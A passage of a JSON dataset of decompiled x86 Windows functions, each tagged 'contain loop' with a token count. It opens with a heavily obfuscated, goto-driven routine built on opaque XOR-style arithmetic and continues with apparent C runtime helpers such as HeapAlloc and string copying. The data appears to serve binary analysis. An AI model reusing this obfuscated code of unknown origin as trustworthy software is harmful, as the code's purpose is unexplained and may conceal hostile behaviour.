              goto code_r0x00416334;\n                                }\n                                fcn.00405830();\n                                uVar2 = uStackY10604;\n                                uVar6 = uStackY10608;\n                                if (uVar3 == uVar1 + uStackY7288 % 7 + 1) {\n                                    uStackY7232 = uStackY10612;\n                                    uStackY7233 = uStackY10597;\n                                    uStackY7240 = uStackY10597;\n                                    uStackY7244 = uStackY10612 + 0x56503f90;\n                                    iStackY7248 = (uStackY7240 + uStackY7244) -\n                                                  ((uStackY7240 & uStackY7244) + (uStackY7244 & uStackY7240));\n                                    uStackY10598 = iStackY7248 + 0x10;\n                                    goto code_r0x0041628c;\n                                }\n                                fcn.00405830();\n                                uVar3 = uStackY10604;\n                                uVar1 = uStackY10608;\n                                if (uVar2 == uVar6 + (uStackY7180 & 7) + 1) {\n                                    uStackY7112 = uStackY10612;\n                                    uStackY7113 = uStackY10597;\n                                    uStackY7120 = uStackY10597;\n                                    uStackY7124 = uStackY10612 + 0x33959740;\n                                    iStackY7128 = (uStackY7120 + uStackY7124) -\n                                                  ((uStackY7120 & uStackY7124) + (uStackY7124 & uStackY7120));\n                                    uStackY10598 = iStackY7128 + 0x40;\n                                    goto code_r0x0041627d;\n                                }\n                                fcn.00405830();\n                                if (uVar3 != uVar1 + uStackY7072 % 9 + 1) goto code_r0x00414fd9;\n                                uStackY6992 = uStackY10612;\n                                uStackY6993 = uStackY10597;\n                                uStackY7000 = uStackY10597;\n                                uStackY7004 = uStackY10612 + 0x10daeef0;\n                                iStackY7008 = (uStackY7000 + uStackY7004) -\n                                              ((uStackY7000 & uStackY7004) + (uStackY7004 & uStackY7000));\n                                uStackY10598 = iStackY7008 + 0x70;\n                                goto code_r0x004161fd;\n                            }\n                            uStackY7472 = uStackY10612;\n                            uStackY7473 = uStackY10597;\n                            uStackY7480 = uStackY10597;\n                            uStackY7484 = uStackY10612 + 0x9bc59030;\n                            iStackY7488 = (uStackY7480 + uStackY7484) -\n                                          ((uStackY7480 & uStackY7484) + (uStackY7484 & uStackY7480));\n                            uStackY10598 = iStackY7488 + 0xb0;\n                            goto code_r0x004163d0;\n                        }\n                        uStackY7592 = uStackY10612;\n                        uStackY7593 = uStackY10597;\n                        uStackY7600 = uStackY10597;\n                        uStackY7604 = uStackY10612 + 0xbe803880;\n                        iStackY7608 = (uStackY7600 + uStackY7604) -\n                                      ((uStackY7600 & uStackY7604) + (uStackY7604 & uStackY7600));\n                        uStackY10598 = iStackY7608 + 0x80;\n                        goto code_r0x004163e2;\n                    }\n                    uStackY7712 = uStackY10612;\n                    uStackY7713 = uStackY10597;\n                    uStackY7720 = uStackY10597;\n                    uStackY7724 = uStackY10612 + 0xe13ae0d0;\n                    iStackY7728 = (uStackY7720 + uStackY7724) -\n                                  ((uStackY7720 & uStackY7724) + (uStackY7724 & uStackY7720));\n                    uStackY10598 = iStackY7728 + 0x50;\n                    goto code_r0x0041649f;\n                }\n                uStackY7832 = uStackY10612;\n                uStackY7833 = uStackY10597;\n                uStackY7840 = uStackY10597;\n                uStackY7844 = uStackY10612 + 0x3f58920;\n                iStackY7848 = (uStackY7840 + uStackY7844) - ((uStackY7840 & uStackY7844) + (uStackY7844 & uStackY7840));\n                uStackY10598 = iStackY7848 + 0x20;\n                goto code_r0x00416560;\n            }\n            uStackY7952 = uStackY10612;\n            uStackY7953 = uStackY10597;\n            uStackY7960 = uStackY10597;\n            uStackY7964 = uStackY10612 + 0x26b03170;\n            iStackY7968 = (uStackY7960 + uStackY7964) - ((uStackY7960 & uStackY7964) + (uStackY7964 & uStackY7960));\n            uStackY10598 = iStackY7968 - 0x10;\ncode_r0x00416612:\n            uStackY10612 = uStackY10608 + *(puStackY10596 + uStackY10612) + uStackY10612;\n        }\n        uStackY10612 = uStackY10612 + 1;\n    } while( true );\n}\n",
        "token_count": 22577
    },
    "00405632": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00405632(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_FS_OFFSET;\n    \n    iVar2 = fcn.00403846();\n    if (iVar2 != 0) {\n        iVar2 = *(*(in_FS_OFFSET + 0x18) + 4);\n        while( true ) {\n            iVar3 = 0;\n            LOCK();\n            iVar1 = iVar2;\n            if (*0x573c1c != 0) {\n                iVar3 = *0x573c1c;\n                iVar1 = *0x573c1c;\n            }\n            *0x573c1c = iVar1;\n            if (iVar3 == 0) break;\n            if (iVar2 == iVar3) {\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 194
    },
    "00405b19": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405b19(uint noname_0, uint *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    if (arg_1ch != 0) {\n        do {\n            fcn.00406488(arg_18h);\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 130
    },
    "00405bf5": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405bf5(char *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    cVar1 = *arg_8h;\n    while ((cVar1 != '\\0' && (cVar1 != ***(*arg_ch + 0x88)))) {\n        pcVar2 = arg_8h + 1;\n        arg_8h = arg_8h + 1;\n        cVar1 = *pcVar2;\n    }\n    arg_8h = arg_8h + 1;\n    if (cVar1 != '\\0') {\n        cVar1 = *arg_8h;\n        while (((cVar1 != '\\0' && (cVar1 != 'e')) && (cVar1 != 'E'))) {\n            pcVar2 = arg_8h + 1;\n            arg_8h = arg_8h + 1;\n            cVar1 = *pcVar2;\n        }\n        cVar1 = arg_8h[-1];\n        pcVar2 = arg_8h;\n        while (pcVar2 = pcVar2 + -1,  cVar1 == '0') {\n            cVar1 = pcVar2[-1];\n        }\n        if (cVar1 == ***(*arg_ch + 0x88)) {\n            pcVar2 = pcVar2 + -1;\n        }\n        do {\n            cVar1 = *arg_8h;\n            pcVar2 = pcVar2 + 1;\n            *pcVar2 = cVar1;\n            arg_8h = arg_8h + 1;\n        } while (cVar1 != '\\0');\n    }\n    return;\n}\n",
        "token_count": 378
    },
    "00405d62": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405d62(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4e4ffb;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0040311b(0);\n    puVar2 = *(param_1 + 0x28);\n    while (puVar2 != NULL) {\n        puVar1 = *puVar2;\n        fcn.00401a2d(puVar2);\n        puVar2 = puVar1;\n    }\n    *(param_1 + 0x28) = 0;\n    puVar2 = *(param_1 + 0x2c);\n    while (puVar2 != NULL) {\n        puVar1 = *puVar2;\n        fcn.00401a2d(puVar2);\n        puVar2 = puVar1;\n    }\n    *(param_1 + 0x2c) = 0;\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 279
    },
    "0040605a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040605a(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    char *pcVar3;\n    uint uVar4;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        if (arg_10h != 0) {\n            pcVar3 = arg_8h;\n            do {\n                cVar1 = pcVar3[arg_10h - arg_8h];\n                *pcVar3 = cVar1;\n                pcVar3 = pcVar3 + 1;\n                if (cVar1 == '\\0') break;\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n            if (arg_ch != 0) {\n                return 0;\n            }\n            *arg_8h = '\\0';\n            puVar2 = fcn.00403a35();\n            uVar4 = 0x22;\n            goto code_r0x004c06da;\n        }\n        *arg_8h = '\\0';\n    }\n    puVar2 = fcn.00403a35();\n    uVar4 = 0x16;\ncode_r0x004c06da:\n    *puVar2 = uVar4;\n    fcn.004037ce();\n    return uVar4;\n}\n",
        "token_count": 308
    },
    "004063cf": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004063cf(void)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    int16_t iVar3;\n    char **ppcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int16_t *piVar9;\n    char **ppcVar10;\n    char *pcVar11;\n    char *pcVar12;\n    int16_t **ppiVar13;\n    int32_t iStack44;\n    int32_t iStack40;\n    char cStack32;\n    uint32_t uStack28;\n    char *pcStack20;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    fcn.004058a8(0);\n    pcVar11 = 0x164;\n    pcStack20 = NULL;\n    iStack12 = 0;\n    ppcVar4 = *(iStack40 + 0x9c);\n    iStack16 = 0;\n    do {\n        pcVar12 = pcVar11;\n        if (iStack12 == 1) {\n            iVar6 = fcn.0040409d(pcVar11);\n            iStack16 = 0;\n            if (iVar6 == 0) break;\n            fcn.00403189(iVar6, 0, pcVar11);\n            pcVar12 = 0x164;\n            pcStack20 = pcVar11;\n            iStack16 = iVar6;\n        }\n        iVar6 = iStack16 - ppcVar4;\n        uStack28 = 0;\n        ppcVar10 = ppcVar4;\n        do {\n            if (iStack12 == 1) {\n                *(iVar6 + ppcVar10) = pcVar12 + iStack16;\n                iVar7 = fcn.0040605a(pcVar12 + iStack16, pcStack20 - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            uStack28 = uStack28 + 1;\n            ppcVar10 = ppcVar10 + 1;\n        } while (uStack28 < 7);\n        uStack28 = 0;\n        ppcVar10 = ppcVar4 + 7;\n        do {\n            if (iStack12 == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + iStack16;\n                iVar7 = fcn.0040605a(pcVar12 + iStack16, pcStack20 - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 7);\n        uStack28 = 0;\n        ppcVar10 = ppcVar4 + 0xe;\n        do {\n            if (iStack12 == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + iStack16;\n                iVar7 = fcn.0040605a(pcVar12 + iStack16, pcStack20 - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 0xc);\n        uStack28 = 0;\n        ppcVar10 = ppcVar4 + 0x1a;\n        do {\n            if (iStack12 == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + iStack16;\n                iVar7 = fcn.0040605a(pcVar12 + iStack16, pcStack20 - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 0xc);\n        uStack28 = 0;\n        ppcVar10 = ppcVar4 + 0x26;\n        do {\n            if (iStack12 == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + iStack16;\n                iVar7 = fcn.0040605a(pcVar12 + iStack16, pcStack20 - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 2);\n        if (iStack12 == 1) {\n            *(iStack16 + 0xa0) = pcVar12 + iStack16;\n            iVar7 = fcn.0040605a(pcVar12 + iStack16, pcStack20 - pcVar12, ppcVar4[0x28]);\n            if (iVar7 != 0) goto code_r0x004becc2;\n        }\n        pcVar8 = ppcVar4[0x28];\n        pcVar11 = pcVar8 + 1;\n        do {\n            cVar2 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar2 != '\\0');\n        pcVar8 = pcVar8 + pcVar12 + (1 - pcVar11);\n        if (iStack12 == 1) {\n            *(iStack16 + 0xa4) = pcVar8 + iStack16;\n            iVar7 = fcn.0040605a(pcVar8 + iStack16, pcStack20 - pcVar8, ppcVar4[0x29]);\n            if (iVar7 != 0) goto code_r0x004becc2;\n        }\n        pcVar12 = ppcVar4[0x29];\n        pcVar11 = pcVar12 + 1;\n        do {\n            cVar2 = *pcVar12;\n            pcVar12 = pcVar12 + 1;\n        } while (cVar2 != '\\0');\n        pcVar12 = pcVar12 + pcVar8 + (1 - pcVar11);\n        if (iStack12 == 1) {\n            *(iStack16 + 0xa8) = pcVar12 + iStack16;\n            iVar7 = fcn.0040605a(pcVar12 + iStack16, pcStack20 - pcVar12, ppcVar4[0x2a]);\n            if (iVar7 != 0) goto code_r0x004becc2;\n        }\n        pcVar11 = ppcVar4[0x2a];\n        pcVar8 = pcVar11 + 1;\n        do {\n            cVar2 = *pcVar11;\n            pcVar11 = pcVar11 + 1;\n        } while (cVar2 != '\\0');\n        pcVar11 = pcVar11 + pcVar12 + (1 - pcVar8);\n        if (iStack12 == 1) {\n            *(iStack16 + 0xac) = ppcVar4[0x2b];\n            *(iStack16 + 0xb0) = 0;\n        }\n        uStack28 = 0;\n        ppiVar13 = ppcVar4 + 0x2d;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (iStack12 == 1) {\n                iVar7 = iStack16 + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.00403977(iVar7, pcStack20 - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 7);\n        uStack28 = 0;\n        ppiVar13 = ppcVar4 + 0x34;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (iStack12 == 1) {\n                iVar7 = iStack16 + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.00403977(iVar7, pcStack20 - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 7);\n        uStack28 = 0;\n        ppiVar13 = ppcVar4 + 0x3b;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (iStack12 == 1) {\n                iVar7 = iStack16 + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.00403977(iVar7, pcStack20 - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 0xc);\n        uStack28 = 0;\n        ppiVar13 = ppcVar4 + 0x47;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (iStack12 == 1) {\n                iVar7 = iStack16 + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.00403977(iVar7, pcStack20 - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 0xc);\n        uStack28 = 0;\n        ppiVar13 = ppcVar4 + 0x53;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (iStack12 == 1) {\n                iVar7 = iStack16 + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.00403977(iVar7, pcStack20 - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 2);\n        for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (iStack12 == 1) {\n            iVar6 = iStack16 + (pcVar11 & 0xfffffffe);\n            *(iStack16 + 0x154) = iVar6;\n            iVar6 = fcn.00403977(iVar6, pcStack20 - pcVar11 >> 1, ppcVar4[0x55]);\n            if (iVar6 != 0) goto code_r0x004becc2;\n        }\n        piVar9 = ppcVar4[0x55];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (iStack12 == 1) {\n            iVar6 = iStack16 + (pcVar11 & 0xfffffffe);\n            *(iStack16 + 0x158) = iVar6;\n            iVar6 = fcn.00403977(iVar6, pcStack20 - pcVar11 >> 1, ppcVar4[0x56]);\n            if (iVar6 != 0) goto code_r0x004becc2;\n        }\n        piVar9 = ppcVar4[0x56];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (iStack12 == 1) {\n            iVar6 = iStack16 + (pcVar11 & 0xfffffffe);\n            *(iStack16 + 0x15c) = iVar6;\n            iVar6 = fcn.00403977(iVar6, pcStack20 - pcVar11 >> 1, ppcVar4[0x57]);\n            if (iVar6 != 0) goto code_r0x004becc2;\n        }\n        piVar9 = ppcVar4[0x57];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (iStack12 == 1) {\n            iVar6 = iStack16 + (pcVar11 & 0xfffffffe);\n            *(iStack16 + 0x160) = iVar6;\n            iVar6 = fcn.00403977(iVar6, pcStack20 - pcVar11 >> 1, ppcVar4[0x58]);\n            if (iVar6 != 0) {\ncode_r0x004becc2:\n                fcn.0040366b(0, 0, 0, 0, 0);\n                pcVar5 = swi(3);\n                iVar6 = (*pcVar5)();\n                return iVar6;\n            }\n        }\n        piVar9 = ppcVar4[0x58];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        iStack12 = iStack12 + 1;\n        pcVar11 = pcVar11 + ((piVar9 - piVar1 >> 1) + 1) * 2;\n    } while (iStack12 < 2);\n    if (cStack32 != '\\0') {\n        *(iStack44 + 0x350) = *(iStack44 + 0x350) & 0xfffffffd;\n    }\n    return iStack16;\n}\n",
        "token_count": 4371
    },
    "00406424": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406424(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040620d(0);\n    iVar4 = *(arg_8h + 0xc);\n    while (iVar4 != 0) {\n        iVar4 = iVar4 + -1;\n        piVar1 = *(*(arg_8h + 8) + iVar4 * 4);\n        if (piVar1 != NULL) {\n            pcVar2 = *(*piVar1 + 8);\n            (**0x578000)();\n            puVar3 = (*pcVar2)();\n            if (puVar3 != NULL) {\n                pcVar2 = **puVar3;\n                (**0x578000)(1);\n                (*pcVar2)();\n            }\n        }\n    }\n    fcn.00404179(*(arg_8h + 8));\n    fcn.004036f2();\n    return;\n}\n",
        "token_count": 241
    },
    "0046a971": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.0046a971(int32_t param_1, int32_t param_2, int32_t param_3, int32_t param_4, int32_t param_5)\n\n{\n    uint32_t arg_1ch;\n    int32_t iVar1;\n    int32_t arg_18h;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    arg_1ch = param_2 - param_1 >> 1;\n    uVar3 = 0xffffffff;\n    uVar2 = param_4 - param_3 >> 1;\n    if (param_5 == 0) {\n        iVar1 = fcn.00403819();\n        iVar1 = *(iVar1 + 4);\n    }\n    else {\n        iVar1 = *(param_5 + 4);\n    }\n    if (iVar1 == 0) {\n        if (uVar2 <= arg_1ch) {\n            fcn.00405830(param_1, param_3, uVar2 * 2);\n        }\n    }\n    else {\n        arg_18h = fcn.00401596(arg_1ch);\n        if (arg_18h != 0) {\n            uVar3 = fcn.0040466a(iVar1, 0x400, param_3, uVar2, arg_18h, arg_1ch);\n            if (uVar3 == 0) {\n                uVar3 = fcn.0040466a(iVar1, 0x400, param_3, uVar2, 0, 0);\n                if (uVar3 == 0) {\n                    uVar3 = 0x7fffffff;\n                }\n            }\n            else {\n                uVar2 = 0;\n                if (uVar3 != 0) {\n                    do {\n                        *(param_1 + uVar2 * 2) = *(uVar2 + arg_18h);\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < uVar3);\n                }\n            }\n        }\n        fcn.00404179(arg_18h);\n        uVar2 = uVar3;\n    }\n    return uVar2;\n}\n",
        "token_count": 484
    },
    "004047af": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004047af(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    if (arg_18h != 0) {\n        do {\n            fcn.00406488(arg_14h);\n            arg_18h = arg_18h + -1;\n        } while (arg_18h != 0);\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 125
    },
    "00403b98": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403b98(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    if (arg_18h != 0) {\n        do {\n            fcn.00401dd4(arg_14h);\n            arg_18h = arg_18h + -1;\n        } while (arg_18h != 0);\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 127
    },
    "0047e756": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.0047e756(uint8_t *arg_8h, uint8_t *arg_ch, ushort *arg_10h)\n\n{\n    ushort uVar1;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            uVar1 = fcn.0040557e(*arg_8h);\n            arg_8h = arg_8h + 1;\n            *arg_10h = uVar1;\n            arg_10h = arg_10h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 139
    },
    "0047e795": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.0047e795(uint8_t *arg_8h, uint8_t *arg_ch, ushort *arg_10h)\n\n{\n    ushort uVar1;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            uVar1 = fcn.00405b69(*arg_8h);\n            arg_8h = arg_8h + 1;\n            *arg_10h = uVar1;\n            arg_10h = arg_10h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 139
    },
    "00406749": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406749(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    if (arg_18h != 0) {\n        do {\n            fcn.00406776(arg_14h);\n            arg_18h = arg_18h + -1;\n        } while (arg_18h != 0);\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 125
    },
    "004895e5": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004895e5(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (param_1 < 0xffffffe1) {\n        if (param_1 == 0) {\n            param_1 = 1;\n        }\n        do {\n            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x5755b8, 0, param_1);\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar1 = fcn.004048fe();\n        } while ((iVar1 != 0) && (iVar1 = fcn.0040417e(param_1),  iVar1 != 0));\n    }\n    puVar2 = fcn.00403a35();\n    *puVar2 = 0xc;\n    return 0;\n}\n",
        "token_count": 194
    },
    "0048adf4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0048adf4(uint8_t *param_1, uint8_t *param_2, uint8_t *param_3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint uVar6;\n    bool bVar7;\n    \n    iVar2 = *(param_1 + 4);\n    if (((iVar2 == 0) || (puVar5 = iVar2 + 8,  *puVar5 == 0)) || (((*param_1 & 0x80) != 0 && ((*param_2 & 0x10) != 0))))\n    {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = 0;\n        if (iVar2 != *(param_2 + 4)) {\n            puVar3 = *(param_2 + 4) + 8;\n            do {\n                uVar1 = *puVar5;\n                bVar7 = uVar1 < *puVar3;\n                if (uVar1 != *puVar3) {\ncode_r0x0048a56e:\n                    uVar4 = -bVar7 | 1;\n                    goto code_r0x0048a573;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar5[1];\n                bVar7 = uVar1 < puVar3[1];\n                if (uVar1 != puVar3[1]) goto code_r0x0048a56e;\n                puVar5 = puVar5 + 2;\n                puVar3 = puVar3 + 2;\n            } while (uVar1 != 0);\n            uVar4 = 0;\ncode_r0x0048a573:\n            if (uVar4 != 0) {\n                return 0;\n            }\n        }\n        if ((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&\n           ((((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)) && (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))))) {\n            uVar6 = 1;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 527
    },
    "0048aebd": {
        "rules": [
            "contain loop"
        ],
